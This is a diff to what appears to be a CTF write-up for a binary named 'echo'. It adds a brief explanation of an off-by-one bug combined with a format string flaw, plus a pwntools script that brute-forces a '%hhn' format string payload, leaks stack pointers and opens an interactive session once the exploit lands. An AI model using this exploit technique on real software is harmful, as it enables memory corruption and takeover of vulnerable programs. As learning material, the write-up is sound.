@@ -24,7 +24,22 @@ int sub_870()
 }
 ```
 
-Off by one error will lead the change of saved ebp and format string attack that pointed to saved ebp will lead to write on arbitrary address around stack :O.
+Off by one error will lead the change of saved ebp and format string attack that pointed to saved ebp will lead to write on arbitrary address around stack :O. With little brute force in script(the probabilty of success is 1/16)
+```
+from pwn import *
+
+
+while True:
+    r = process('./echo')
+    payload = '%112x%10$hhn %10$p %15$p '.ljust(0x21, chr(0x58))
+    r.send(payload)
+    print payload.__len__()
+    line = r.recv(150).split()
+    target = int(line[1], 16)
+    leak = int(line[2], 16)
+    if leak - target == 240:
+        r.interactive()
+```
 
 Here is the interaction:
 ```
